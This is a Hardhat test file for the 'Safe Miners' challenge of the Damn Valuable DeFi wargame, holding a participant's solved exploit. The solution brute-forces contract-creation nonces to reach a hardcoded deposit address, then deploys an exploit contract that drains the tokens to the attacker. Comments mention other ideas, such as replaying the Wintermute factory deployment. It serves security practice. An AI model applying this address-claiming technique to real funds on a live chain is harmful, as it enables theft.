const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Safe Miners', function () {
    let deployer, attacker;

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        //Tried many different things here and didnt get on the right track until allowed me to google some hints
        //I always thought ethers.getSigners() calculates a random keypair in each run, so I didnt think of this myself :(
        //I even tried to compute nonces from the Oracle private keys from the compromised challenge and even 
        //attempted to do a replay attack of the gnosis-factory from the wintermute incident! Welp, better luck next time :^)

        //Trying to make it a little less brute-force by pre-calculating the two needed nonces by just 
        //pre-calculating the addresses and only deploying empty contracts until we reach the nonces
        
        let flag = false;
        let baseAddressNonce, contractAddressNonce = 0;

        //look if the attacker can create a contract (or a contract of a contract) that holds the funds
        for(i = 0; i < 100 && flag == false; i++){
            let level1ContractAttacker = ethers.utils.getContractAddress( {from:attacker.address, nonce: i} );
            for( j = 0; j < 100; j++){
                let addressAttacker = ethers.utils.getContractAddress( {from:level1ContractAttacker, nonce: j} );
                if(addressAttacker === DEPOSIT_ADDRESS){
                    //We found the two nonces, save values and break out of the loop
                    console.log("HIT!");
                    baseAddressNonce = i;
                    contractAddressNonce = j;
                    flag = true;
                }
            }
        }

        if(flag == true){
            for(let i = 0; i < baseAddressNonce; i++){
                //Deploy empty contracts until we are at proper base-address-nonce
                await (await ethers.getContractFactory("EmptyContract", attacker)).deploy();
            }
            //Now we have the proper contract nonce, but we still need that contract's nonce to be incremented to the necessary value
            await (await ethers.getContractFactory("SafeMinersExploit", attacker)).deploy(attacker.address, this.token.address, contractAddressNonce);    
        }
        else{
            console.log("Did not find proper address!")
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });
});
